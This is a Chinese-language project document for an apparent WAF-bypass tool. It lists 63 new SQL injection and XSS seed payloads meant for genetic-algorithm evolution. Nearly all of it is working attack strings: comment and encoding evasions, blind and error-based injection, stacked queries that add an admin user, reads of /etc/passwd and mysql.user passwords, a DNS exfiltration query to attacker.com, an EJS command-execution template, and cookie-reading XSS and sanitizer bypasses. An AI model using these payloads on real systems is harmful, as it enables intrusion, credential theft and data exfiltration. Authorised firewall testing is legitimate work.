# 高级 SQLi 和 XSS 种子样例补充说明

## 概述

本次为 WAF Bypasser 项目补充了 **63 个高质量种子样例**，用于遗传算法的变异和进化：

- **SQL Injection**: +29 个高级技术种子（92 → 121）
- **XSS**: +34 个高级向量种子（25 → 59）

所有 payload 均符合项目质量标准：真实攻击语义、可观察的成功指标、详细的使用说明。

---

## SQL Injection 新增技术（29个）

### 1. 内联注释绕过（4个）
**目的**: 绕过基于空格和关键字的 WAF 检测

```sql
1'/**/OR/**/1=1--
1'/**/UNION/**/SELECT/**/user,password/**/FROM/**/users--
1'/*!50000OR*/1=1--
1'UNION/*comment*/SELECT/*another*/1,database()--
```

**攻击场景**: 
- MySQL/MariaDB 环境
- WAF 拦截 `OR 1=1` 但允许注释
- 使用 MySQL 版本注释条件执行

---

### 2. 数值混淆（3个）
**目的**: 绕过基于字面值 `1=1` 的检测

```sql
1'OR 1e0=1e0--           # 科学计数法
1'OR 0x31=0x31--         # 十六进制
1'AND 0.1+0.9=1.0--      # 浮点运算
```

**攻击场景**:
- WAF 黑名单 `1=1` 但未处理数学表达式
- 需要恒真条件但避免明显特征

---

### 3. 备用注释终止符（3个）
**目的**: 适配不同数据库和 URL 环境

```sql
1' OR 1=1-- -            # SQL 标准（双横线+空格）
1' OR 1=1;%00            # 空字节截断
1' UNION SELECT user(),database()#  # MySQL 井号注释
```

**攻击场景**:
- URL 路径中 `#` 被解析为锚点
- PostgreSQL 环境需要 `--` 加空格
- 老旧系统支持空字节截断

---

### 4. 函数混淆（4个）
**目的**: 用函数调用替代直接值比较

```sql
1'OR(SELECT 1)=1--
1'AND EXISTS(SELECT 1 FROM users WHERE SUBSTRING(password,1,1)='a')--
1'AND'1'IN('1')--
admin'AND'1'LIKE'1
```

**攻击场景**:
- 布尔盲注逐字符提取
- 绕过 `=` 操作符过滤
- 利用 EXISTS 进行条件判断

---

### 5. 编码绕过（3个）
**目的**: 多层编码绕过 WAF 解码逻辑

```sql
1%2527%2520OR%25201=1--  # 双重 URL 编码
1%C0%A7 OR 1=1--         # UTF-8 超长编码（单引号）
%df%27 UNION SELECT...   # GBK 宽字节吞噬反斜杠
```

**攻击场景**:
- WAF 只解码一次，应用层解码两次
- GBK/GB2312 编码环境
- 老旧系统的 UTF-8 解析漏洞

---

### 6. 时间盲注变体（3个）
**目的**: 绕过 SLEEP 函数检测

```sql
1'AND BENCHMARK(10000000,MD5('test'))--
1'AND GET_LOCK('pwned',5)--
1'AND 'a' RLIKE CONCAT(REPEAT('(a',50),REPEAT(')',50))--
```

**攻击场景**:
- WAF 拦截 SLEEP 函数
- 需要延时验证但无 SLEEP 权限
- 利用正则回溯造成 ReDoS

---

### 7. 报错注入变体（3个）
**目的**: 通过错误消息外带数据

```sql
# Floor 报错
1'AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--

# EXP 溢出报错
1'AND EXP(~(SELECT * FROM(SELECT version())x))--

# 几何函数类型错误
1'AND GeometryCollection((SELECT * FROM(SELECT user())x))--
```

**攻击场景**:
- UpdateXML/ExtractValue 被禁用
- 需要直接回显数据
- MySQL 5.x 环境

---

### 8. 堆叠查询（3个）
**目的**: 执行多条 SQL 语句

```sql
1'; INSERT INTO users(user,pass) VALUES('hacker',MD5('pwned'))--
1'; UPDATE users SET is_admin=1 WHERE user='attacker'--
admin'--   # 二阶注入种子（注册时存储，查询时触发）
```

**攻击场景**:
- 应用支持多语句执行
- 需要修改数据库状态
- 二阶注入场景

---

### 9. 高级信息泄露（3个）
**目的**: 系统信息获取和带外数据传输

```sql
1' UNION SELECT 1,LOAD_FILE('/etc/passwd')--
1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\a'))--
1' UNION SELECT 1,GROUP_CONCAT(user,0x3a,password) FROM mysql.user--
```

**攻击场景**:
- 文件读取（需 FILE 权限）
- DNS 外带数据（UNC 路径触发）
- MySQL 用户枚举

---

## XSS 新增向量（34个）

### 1. 事件处理器多样性（6个）
**目的**: 提供更多事件触发方式

```html
<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(document.domain)>
<style>div{transition:color 1s}</style><div style=color:red ontransitionend=alert(document.cookie)...>
<marquee onstart=alert(document.domain)>XSS</marquee>
<video><source onerror=alert(document.domain)></video>
<input onfocusin=alert(document.domain) autofocus>
<body onpageshow=alert(document.domain)>
```

**攻击场景**:
- 常见事件处理器被过滤（onerror, onload）
- 需要自动触发（无需用户交互）
- CSS 动画/过渡作为触发器

---

### 2. Data URI 协议（4个）
**目的**: 绕过 src/href 白名单

```html
<iframe src=data:text/html,<script>alert(parent.document.domain)</script>>
<object data=data:text/html,<script>alert(document.domain)</script>>
<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>
<a href=javascript:%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29>X</a>
```

**攻击场景**:
- WAF 只检查 http/https 协议
- Base64 编码绕过关键字检测
- javascript: 伪协议 URL 编码

---

### 3. 高级编码绕过（5个）
**目的**: 多层编码混淆 payload

```html
<script>\u0061\u006c\u0065\u0072\u0074(document.domain)</script>
<script>eval('\x61\x6c\x65\x72\x74(document.domain)')</script>
<script>eval('\141\154\145\162\164(1)')</script>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;1&#x29;>
```

**攻击场景**:
- Unicode/十六进制/八进制转义
- HTML 实体编码（十进制/十六进制）
- 多层 eval 执行

---

### 4. 上下文特定逃逸（4个）
**目的**: 从不同上下文中逃逸执行 JS

```javascript
// JS 字符串上下文
'-alert(document.domain)-'

// HTML 属性上下文
" onload="alert(document.domain)

// CSS 上下文
</style><script>alert(document.domain)</script>

// JS 模板字符串
${alert(document.domain)}
```

**攻击场景**:
- 输入被插入到 `var x='用户输入'`
- 输入在 HTML 属性值中
- 输入在 `<style>` 标签内
- ES6 模板字符串注入

---

### 5. 框架模板注入（3个）
**目的**: 利用前端框架的模板引擎

```javascript
// Angular
{{constructor.constructor('alert(document.domain)')()}}

// Vue
{{_c.constructor('alert(document.domain)')()}}

// EJS (服务端)
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

**攻击场景**:
- Angular 1.x 沙箱绕过
- Vue.js 模板注入
- EJS/Pug 等服务端模板引擎 SSTI

---

### 6. SVG 特定向量（3个）
**目的**: 利用 SVG 标签的特殊性

```html
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
<svg><set attributeName=onload to=alert(document.domain)>
<svg><foreignObject width=100 height=100><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(document.domain)</script></body></foreignObject></svg>
```

**攻击场景**:
- 只允许 SVG 标签的上传
- SVG 动画事件触发
- foreignObject 嵌入 HTML

---

### 7. Polyglot 多上下文（2个）
**目的**: 在多种注入点都能生效的通用 payload

```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>'

"><script>alert(document.domain)</script>
```

**攻击场景**:
- 不确定注入点的具体上下文
- 需要在 HTML/JS/属性中都能触发
- 自动闭合多种标签和引号

---

### 8. WAF 绕过技巧（5个）
**目的**: 绕过基于空格和关键字的 WAF

```html
<img/src=x/onerror=alert(document.domain)>      # 斜杠替代空格
<img src=x%0aonerror=alert(document.domain)>    # 换行符
<img src=x%09onerror=alert(document.domain)>    # Tab 字符
<img src=x%00 onerror=alert(document.domain)>   # 空字节
<ImG sRc=x OnErRoR=alert(document.domain)>      # 大小写混合
```

**攻击场景**:
- WAF 只识别空格分隔的属性
- 正则匹配 `<img src=` 失败
- 大小写敏感的黑名单

---

### 9. Mutation XSS (mXSS)（2个）
**目的**: 利用 HTML 解析器的差异

```html
<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">

<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(document.domain)>
```

**攻击场景**:
- innerHTML 重新解析后标签逃逸
- DOMPurify 等净化器的绕过
- 浏览器解析器差异利用

---

## 使用建议

### 作为遗传算法种子

1. **SQLi 进化方向**:
   - 注释变体 → 更多 MySQL 版本注释
   - 编码链 → 三重/四重编码
   - 函数嵌套 → 更深层次的子查询

2. **XSS 进化方向**:
   - 事件组合 → 多个事件链式触发
   - 编码混合 → Unicode + HTML 实体混合
   - 标签嵌套 → SVG + foreignObject + iframe

3. **交叉变异**:
   - SQLi 的编码技术应用到 XSS
   - XSS 的空白变体应用到 SQLi
   - 多上下文逃逸技术互相借鉴

### 测试目标优先级

| 技术类别 | 优先级 | 适用场景 |
|---------|--------|---------|
| 内联注释绕过 | ⭐⭐⭐⭐⭐ | MySQL WAF 必测 |
| 宽字节注入 | ⭐⭐⭐⭐⭐ | GBK 编码站点 |
| 时间盲注变体 | ⭐⭐⭐⭐ | SLEEP 被禁用 |
| Data URI | ⭐⭐⭐⭐⭐ | CSP/白名单绕过 |
| 模板注入 | ⭐⭐⭐⭐⭐ | 前端框架站点 |
| mXSS | ⭐⭐⭐⭐ | 使用净化器的站点 |

---

## 质量标准符合性

所有新增 payload 均满足以下标准：

✅ **真实攻击语义** - 执行实际的恶意操作（数据提取、代码执行、权限提升）  
✅ **可观察成功指标** - 明确的攻击成功判定条件  
✅ **详细使用说明** - `usage_method` 字段说明注入点和适用场景  
✅ **目标环境分类** - 按 `target` 和 `difficulty` 分类  
✅ **技术分类准确** - `category` 字段正确标识技术类型  

---

## 数据库统计

```
SQL Injection: 92 → 121 (+29)
├─ 编码绕过: 12 (最多)
├─ 逻辑绕过: 9
├─ 函数混淆: 7
├─ 时间盲注: 7
├─ 空格绕过: 6
└─ 其他 22 个类别

XSS: 25 → 59 (+34)
├─ 反射型: 13 (最多)
├─ 编码绕过: 6
├─ 事件触发: 6
├─ 协议处理: 4
├─ 空白变体: 4
└─ 其他 10 个类别

总计: 579 → 642 (+63 个高质量种子)
```

---

## 脚本位置

```
C:\WAFByPasser\scripts\insert_advanced_sqli_xss_seeds.py
```

运行方式：
```bash
python scripts/insert_advanced_sqli_xss_seeds.py
```

脚本会自动去重（基于 `vulnerability + target + content`），不会插入重复 payload。
